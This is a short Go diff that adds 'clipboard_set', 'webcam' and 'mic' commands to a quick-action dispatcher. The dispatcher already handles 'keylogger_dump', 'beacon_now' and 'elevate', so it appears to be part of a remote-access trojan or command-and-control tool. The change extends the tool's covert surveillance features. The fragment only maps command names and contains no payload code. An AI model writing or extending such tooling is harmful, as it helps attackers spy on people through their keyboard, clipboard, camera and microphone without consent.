@@ -165,6 +165,12 @@ func buildQuickActionCommand(action, param, shell string) (string, string) {
 		return "keylogger_dump", ""
 	case "clipboard_get":
 		return "clipboard_get", ""
+	case "clipboard_set":
+		return "clipboard_set", param
+	case "webcam":
+		return "webcam", param
+	case "mic":
+		return "mic", param
 	case "beacon_now":
 		return "beacon_now", ""
 	case "elevate":
